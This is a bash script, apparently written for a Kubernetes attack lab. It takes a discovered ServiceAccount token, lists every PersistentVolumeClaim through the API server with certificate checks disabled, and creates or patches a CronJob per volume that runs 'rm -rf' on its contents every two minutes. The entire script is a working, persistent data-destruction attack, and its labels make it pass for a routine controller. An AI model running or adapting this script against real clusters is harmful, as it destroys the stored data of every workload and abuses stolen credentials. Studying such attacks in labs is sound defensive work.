#!/usr/bin/env bash
set -euo pipefail

# ================== CONFIG ==================
TIME="2"
IMAGE="alpine:3.20"
WIPE_CMD='rm -rf /target/* /target/.[!.]* /target/..?* || true'
CJ_PREFIX="wipe-pvc"
CURL_TIMEOUT="20"
API_SERVER="https://$CLUSTER_NAME-control-plane:6443"

TOKEN_FILE="$DATA_PATH/KC5/found_token"
SCHEDULE="*/$TIME * * * *"

if [[ ! -f "$TOKEN_FILE" ]]; then
  echo "Impossible to find ServiceAccount token" >&2
  exit 1
fi

AUTH_HEADER="Authorization: Bearer $(cat "${TOKEN_FILE}")"

curl_k8s () {
  local method="$1"; shift
  local path="$1"; shift
  local body="${1:-}"; shift || true
  local query="${1:-}"; shift || true
  local url="${API_SERVER}${path}"
  if [[ -n "$query" ]]; then
    url="${url}?${query}"
  fi

  if [[ -n "$body" ]]; then
    curl -sSk --fail -X "${method}" \
      --max-time "${CURL_TIMEOUT}" \
      -H "${AUTH_HEADER}" \
      -H "Content-Type: application/json" \
      -d "${body}" \
      "${url}"
  else
    curl -sSk --fail -X "${method}" \
      --max-time "${CURL_TIMEOUT}" \
      -H "${AUTH_HEADER}" \
      "${url}"
  fi
}

urlencode () {
  printf '%s' "$1" | jq -sRr @uri
}

need_cmd () {
  command -v "$1" >/dev/null 2>&1 || { echo "Command not found: $1" >&2; exit 1; }
}

need_cmd jq

# === Costruisci query per lista PVC ===
echo ">> Getting PVC..."
PVC_JSON="$(curl_k8s GET "/api/v1/persistentvolumeclaims" "" "")"

PVC_COUNT=$(echo "${PVC_JSON}" | jq -r '.items | length')
if [[ "${PVC_COUNT}" -eq 0 ]]; then
  echo "No PVC found"
  exit 0
fi
echo "Found ${PVC_COUNT} PVC."

sanitize_name () {
  local s
  s=$(echo "$1" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9-]/-/g' | sed 's/^-*//; s/-*$//')
  echo "${s:0:52}"
}

make_cronjob_body () {
  local ns="$1"
  local pvc="$2"
  local cj_name="$3"

  # JSON body of CronJob (batch/v1)
  cat <<JSON
{
  "apiVersion": "batch/v1",
  "kind": "CronJob",
  "metadata": {
    "name": "${cj_name}",
    "namespace": "${ns}",
    "labels": {
      "app.kubernetes.io/name": "pvc-wiper",
      "app.kubernetes.io/managed-by": "custom-controller",
      "pvc.kubernetes.io/name": "${pvc}"
    }
  },
  "spec": {
    "schedule": "$(echo "${SCHEDULE}")",
    "concurrencyPolicy": "Forbid",
    "successfulJobsHistoryLimit": 1,
    "failedJobsHistoryLimit": 1,
    "jobTemplate": {
      "spec": {
        "template": {
          "metadata": {
            "labels": {
              "app.kubernetes.io/name": "pvc-wiper",
              "pvc.kubernetes.io/name": "${pvc}"
            }
          },
          "spec": {
            "restartPolicy": "Never",
            "containers": [
              {
                "name": "wiper",
                "image": "${IMAGE}",
                "command": ["/bin/sh","-euxc","${WIPE_CMD}"],
                "volumeMounts": [
                  {"name": "target", "mountPath": "/target"}
                ]
              }
            ],
            "volumes": [
              {
                "name": "target",
                "persistentVolumeClaim": {"claimName": "${pvc}"}
              }
            ]
          }
        }
      }
    }
  }
}
JSON
}

create_or_patch_cronjob () {
  local ns="$1"
  local pvc="$2"
  local cj_name_raw="${CJ_PREFIX}-${pvc}"
  local cj_name
  cj_name="$(sanitize_name "${cj_name_raw}")"

  echo ">> [${ns}] PVC='${pvc}' -> CronJob '${cj_name}'"

  local body
  body="$(make_cronjob_body "${ns}" "${pvc}" "${cj_name}")"

  # CREATE
  local path="/apis/batch/v1/namespaces/${ns}/cronjobs"

  # Trying to create
  set +e
  CREATE_OUT=$(curl_k8s POST "${path}" "${body}") ; rc=$?
  set -e

  if [[ $rc -eq 0 ]]; then
    echo "   -> created"
    return
  fi

  # If it exists, doing PATCH (merge patch) to balance spec
  echo "   -> already existing, run PATCH..."
  local patch_body
  patch_body="$(echo "${body}" | jq '{metadata: {labels: .metadata.labels}, spec: .spec}')"

  local patch_q=""

  curl -sSk --fail -X PATCH \
    --max-time "${CURL_TIMEOUT}" \
    -H "${AUTH_HEADER}" \
    -H "Content-Type: application/merge-patch+json" \
    -d "${patch_body}" \
    "${API_SERVER}/apis/batch/v1/namespaces/${ns}/cronjobs/${cj_name}${patch_q:+?${patch_q}}" \
    >/dev/null

  echo "   -> patch applied"
}

# === Itera tutte le PVC ===
echo "${PVC_JSON}" | jq -r '.items[] | "\(.metadata.namespace);\(.metadata.name)"' | \
while IFS=';' read -r ns pvc; do
  [[ -z "$ns" || -z "$pvc" ]] && continue
  create_or_patch_cronjob "$ns" "$pvc"
done

echo ">> Done, waiting $TIME seconds for the first Cronjob..."
sleep $TIME
echo "DONE"